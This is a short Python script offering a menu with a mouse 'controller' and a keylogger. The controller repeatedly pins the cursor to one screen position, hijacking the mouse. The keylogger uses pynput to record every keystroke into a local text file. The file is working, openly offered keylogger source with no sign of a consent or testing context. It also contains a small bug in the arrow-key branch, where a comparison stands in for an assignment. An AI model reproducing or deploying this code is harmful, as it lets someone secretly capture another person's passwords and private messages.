
from pynput.keyboard import Listener
from pynput.mouse import Controller
import pyfiglet, random

def mouse_controller():
    """Mouse_Controller Function to control the cursor position"""
    mouse = Controller()
    mouse.position = (120,100)

def key_reader(key):
    """ Key_Reader function to read the Key strokes and feed them into a text file"""
    key_input = str(key)
    key_input = key_input.replace("'","")

    if key_input == 'Key.enter':
        key_input="\n"
    elif key_input == 'Key.space':
        key_input = " "
    elif key_input == 'Key.backspace':
        key_input = ""
    elif key_input == 'Key.shift':
        key_input = ""
    elif key_input == 'Key.caps_lock':
        key_input = ""
    elif key_input == 'Key.tab':
        key_input = ""
    elif key_input == 'Key.ctrl':
        key_input = ""
    elif key_input == 'Key.cmd_r' or key_input == 'Key.cmd':
        key_input = ""
    elif key_input == 'Key.down' or key_input == 'Key.up' or key_input == 'Key.left' or key_input == 'Key.right':
        key_input == ""

    with open('log_file.txt', 'a') as f:
        f.write(key_input)


# log_file_path = input('\nEnter the Path where your LOG file should be stored [followed by "/" ]: ') # Uncomment this (and add this path var. to open function) to create the logfile elsewhere.
result = pyfiglet.figlet_format("Welcome to PYTHON-LOG")
print(result)

print("\n[01] Mouse Controller\n")
print("\n[02] Key-Logger\n")
print("\n[03] Quit\n")

while True:
    while True:
        try:
            user_choice = int(input("\nChoose an Option: "))
            break
        except:
            print("\nPlease Enter Integer Type Option!!!\n")
    if user_choice==1 or user_choice==0o1:
        for i in range(random.randint(30000,50000)):
            mouse_controller()

    elif user_choice==2 or user_choice==0o2:
        print("\nKey-Logger Initiated!")
        with Listener(on_press=key_reader) as l:
            l.join()

    elif user_choice==3 or user_choice==0o3:
        print("\nBye-Bye"+"\U0001F609\n")
        break

    else:
        print("\nNo Such Option!!!\n")






